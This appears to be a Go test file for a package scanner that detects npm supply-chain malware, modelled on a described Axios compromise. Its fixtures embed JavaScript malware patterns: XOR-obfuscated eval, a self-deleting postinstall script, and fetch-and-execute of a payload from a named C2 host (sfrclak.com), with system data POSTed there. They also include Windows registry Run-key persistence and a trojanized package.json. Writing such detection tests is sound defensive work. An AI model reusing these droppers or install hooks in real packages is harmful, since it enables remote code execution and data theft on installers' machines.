package scanner

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/falcn-io/falcn/pkg/types"
)

// Tests based on the real Axios npm supply chain attack (March 2026).
// UNC1069 (North Korea) compromised axios maintainer, added trojanized
// dependency plain-crypto-js@4.2.1 (typosquat of crypto-js) with a
// cross-platform RAT via postinstall script.

func TestAxios_XORObfuscation(t *testing.T) {
	cs := NewContentScanner()
	// Simulates the Axios _trans_1 and _trans_2 XOR obfuscation functions
	content := `
const _trans_2 = (s) => {
    return Buffer.from(s.split('').reverse().join('').replace(/_/g, '='), 'base64').toString();
};
const _trans_1 = (data, key) => {
    const keyBytes = Buffer.from(key);
    const result = Buffer.alloc(data.length);
    for (let i = 0; i < data.length; i++) {
        result[i] = data.charCodeAt(i) ^ keyBytes[i % keyBytes.length] ^ 333;
    }
    return result.toString();
};
const payload = _trans_1(_trans_2(encrypted_strings[0]), "OrDeR_7077");
eval(payload);
`
	threats := cs.detectCustomCiphers(content)
	if len(threats) == 0 {
		t.Fatal("XOR obfuscation with custom transform functions should be detected")
	}
	if threats[0].Type != types.ThreatTypeCustomCipher {
		t.Errorf("Expected ThreatTypeCustomCipher, got %s", threats[0].Type)
	}
	// Multiple patterns should match (charCodeAt XOR + named function + string reversal)
	t.Logf("Confidence: %.2f, Description: %s", threats[0].Confidence, threats[0].Description)
}

func TestAxios_SelfDeletingScript(t *testing.T) {
	cs := NewContentScanner()
	// Simulates the Axios setup.js that deletes itself after execution
	content := `
const fs = require('fs');
const path = require('path');

// Execute payload
executePayload();

// Clean up — delete self and restore original package.json
fs.unlinkSync(__filename);
if (fs.existsSync(path.join(__dirname, 'package.md'))) {
    fs.renameSync(path.join(__dirname, 'package.md'), path.join(__dirname, 'package.json'));
}
`
	threats := cs.detectAntiForensics(content)
	if len(threats) == 0 {
		t.Fatal("Self-deleting script should be detected")
	}
	if threats[0].Type != types.ThreatTypeAntiForensics {
		t.Errorf("Expected ThreatTypeAntiForensics, got %s", threats[0].Type)
	}
	if threats[0].Severity != types.SeverityCritical {
		t.Errorf("Expected CRITICAL severity, got %s", threats[0].Severity)
	}
}

func TestAxios_PackageJsonRestoration(t *testing.T) {
	cs := NewContentScanner()
	// Simulates the Axios attack restoring clean package.json after install
	content := `
const cleanPkg = JSON.parse(fs.readFileSync('package.md', 'utf8'));
delete cleanPkg.scripts.postinstall;
fs.writeFileSync('package.json', JSON.stringify(cleanPkg, null, 2));
`
	threats := cs.detectAntiForensics(content)
	if len(threats) == 0 {
		t.Fatal("package.json post-attack cleanup should be detected")
	}
	found := false
	for _, th := range threats {
		if strings.Contains(th.Description, "anti-forensic") {
			found = true
		}
	}
	if !found {
		t.Error("Expected anti-forensic technique in description")
	}
}

func TestAxios_CrossPlatformRAT(t *testing.T) {
	cs := NewContentScanner()
	// Simulates the cross-platform payload delivery from Axios attack
	content := `
const os = require('os');
const { execSync } = require('child_process');
const fetch = require('node-fetch');

const platform = os.platform();
if (platform === 'darwin') {
    const resp = await fetch('http://sfrclak.com:8000/6202033');
    fs.writeFileSync('/Library/Caches/com.apple.act.mond', resp.buffer());
    execSync('chmod +x /Library/Caches/com.apple.act.mond');
} else if (platform === 'win32') {
    execSync('copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe %PROGRAMDATA%\\wt.exe');
} else {
    fs.writeFileSync('/tmp/ld.py', pythonPayload);
    execSync('nohup python /tmp/ld.py &');
}
`
	// Should trigger compound behaviors (exec + network + file write + chmod)
	threats := cs.detectCompoundBehaviors(content)
	if len(threats) == 0 {
		t.Fatal("Cross-platform RAT delivery should trigger compound behavior detection")
	}
	if threats[0].Severity < types.SeverityHigh {
		t.Errorf("Expected HIGH or CRITICAL severity, got %s", threats[0].Severity)
	}
}

func TestAxios_C2NewDomain(t *testing.T) {
	cs := NewContentScanner()
	// sfrclak.com — the C2 domain registered one day before the attack
	content := `
fetch('http://sfrclak.com:8000/6202033', {
    method: 'POST',
    body: JSON.stringify(systemInfo)
});
`
	indicators := cs.detectNetworkIndicators(content)
	found := false
	for _, ind := range indicators {
		if strings.Contains(ind, "sfrclak") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("sfrclak.com (C2 domain) should be flagged; indicators: %v", indicators)
	}
}

func TestAxios_WindowsPersistence(t *testing.T) {
	cs := NewContentScanner()
	// Windows persistence via registry Run key (from Axios attack)
	content := `
const { execSync } = require('child_process');
execSync('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v MicrosoftUpdate /t REG_SZ /d "%PROGRAMDATA%\\system.bat" /f');
`
	threats := cs.detectOSPersistence(content)
	if len(threats) == 0 {
		t.Fatal("Windows Run key persistence should be detected")
	}
	if threats[0].Type != types.ThreatTypeOSPersistence {
		t.Errorf("Expected ThreatTypeOSPersistence, got %s", threats[0].Type)
	}
}

func TestAxios_FullScan_IntegrationTest(t *testing.T) {
	tmpDir := t.TempDir()

	// Write a malicious setup.js (postinstall script)
	setupJS := `
const fs = require('fs');
const https = require('https');
const { execSync } = require('child_process');

const _trans_2 = (s) => Buffer.from(s.split('').reverse().join('').replace(/_/g, '='), 'base64').toString();
const _trans_1 = (d, k) => { let r=''; for(let i=0;i<d.length;i++) r+=String.fromCharCode(d.charCodeAt(i)^k.charCodeAt(i%k.length)^333); return r; };

https.get('http://sfrclak.com:8000/6202033', (res) => {
    let data = '';
    res.on('data', d => data += d);
    res.on('end', () => {
        fs.writeFileSync('/tmp/payload', data);
        execSync('chmod +x /tmp/payload && /tmp/payload');
        fs.unlinkSync(__filename);
    });
});
`
	os.WriteFile(filepath.Join(tmpDir, "setup.js"), []byte(setupJS), 0644)

	// Write the trojanized package.json
	packageJSON := `{
    "name": "plain-crypto-js",
    "version": "4.2.1",
    "scripts": {
        "postinstall": "node setup.js"
    }
}`
	os.WriteFile(filepath.Join(tmpDir, "package.json"), []byte(packageJSON), 0644)

	cs := NewContentScanner()
	threats, err := cs.ScanDirectory(tmpDir)
	if err != nil {
		t.Fatalf("ScanDirectory failed: %v", err)
	}

	threatTypes := map[types.ThreatType]bool{}
	for _, th := range threats {
		threatTypes[th.Type] = true
	}

	if len(threats) == 0 {
		t.Fatal("Integration test should find threats in simulated Axios attack")
	}

	t.Logf("Found %d threats across %d types", len(threats), len(threatTypes))
	for tt := range threatTypes {
		t.Logf("  - %s", tt)
	}
}
